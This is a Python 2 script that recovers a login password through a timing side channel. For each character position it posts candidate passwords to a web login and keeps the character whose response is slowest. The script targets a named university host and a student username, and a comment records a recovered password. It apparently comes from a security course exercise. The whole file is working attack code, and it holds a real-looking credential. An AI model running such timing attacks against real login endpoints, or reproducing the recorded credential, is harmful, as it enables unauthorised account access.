import requests
import string
import operator
import sys

# init
url = 'http://www.lca.ic.unicamp.br:8000/'
login = 'ra116470'
pw = '' #pw found: acVefvivyeabta
n = 3 #show top n characters in each iteration
characters = string.letters + string.digits # all characters to iterate over
iterations = 3 # number of iterations done until the next character is found
count_chars = {} # dict to count how many times a character has been the one that 
                 # took the most time

# Iterate over remaining characters until password is found
# (you can give already found characters in the pw var initialization)
for k in range(16 - len(pw)):
  # reset count_chars dict
  for c in characters:
    count_chars[c] = 0

  # main iteration to find the next character
  for i in range(iterations):
    max_time_char = {'time': 0, 'char': ''}
    for c in characters:
      pw_padding = pw + c + '@' # random character '@' for the algorithm to enter the next iteration
      auth = {'username': login, 'password': pw_padding}
      r = requests.post(url, data=auth)
      request_time = r.elapsed.total_seconds()

      if (request_time > max_time_char['time']):
        max_time_char = {'time': request_time, 'char': c}

    print '   char %s took the most time: %.4fs' % (max_time_char['char'], max_time_char['time'])
    count_chars[max_time_char['char']] += 1
    sys.stdout.flush()

  # find next best char
  sorted_best = sorted(count_chars.items(), key=operator.itemgetter(1), reverse=True)

  print 'top %d characters (times won iteration)' % n
  for j in range(n):
    print '\'%s\': %d' % (sorted_best[j][0], sorted_best[j][1])

  # put found character in solution
  pw += sorted_best[0][0]

  print '----- || Finished iteration to find char || -----'
  print '   char that took longer to find: ' + sorted_best[0][0]
  print '   password so far : ' + pw
  sys.stdout.flush()

print 'password found: %s' % pw